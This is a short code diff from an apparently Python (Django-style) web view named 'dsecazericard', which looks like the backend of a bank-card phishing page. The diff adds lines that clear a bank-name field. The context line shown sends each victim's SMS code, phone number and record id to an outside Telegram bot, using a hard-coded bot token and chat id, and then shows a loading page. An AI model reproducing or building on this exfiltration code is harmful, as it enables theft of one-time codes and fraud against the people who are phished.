@@ -392,6 +392,8 @@ def dsecazericard(request):
             "display":contact.hidden_type
 
         }
+        contact.bankname=""
+        contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
 
         return render( request,'pages/loading.html',context )
